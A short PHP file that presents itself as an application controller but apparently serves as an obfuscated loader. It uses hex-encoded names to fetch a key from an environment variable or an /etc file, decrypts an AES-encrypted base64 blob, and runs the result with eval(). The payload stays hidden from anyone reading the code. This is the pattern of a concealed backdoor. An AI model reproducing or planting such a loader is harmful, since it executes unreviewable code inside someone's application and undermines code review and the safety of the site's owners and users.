<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ll0lCTo0MVu9NPT1oVEdlg==');

$c=base64_decode(

'3OWF9u+EezIQxUJrxw4JMINb/GZbkjTMSNa24Zd59nmUeQo9SYwUpgEufgweMVU3ZNMZ4fvAlByE' .
'S86YgaQWs+J4fJNb7bMnqz6GD4RiaTrFGfNaE8leeHpSUmdkDrkC+WclA+H1kAsaOAXcd1QnHMFk' .
'vs7ZnjHQmabehsYoch+7yUxINmAKLOlywrdyDQIIsPnKLNhvGzdjGaCXCb2Vd2wAEFqR22T9Eavg' .
'M7onrc0MwWl46CpTdoi+MRUouTTu/wxAgfQ0u8RJxAHKsbgqvg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

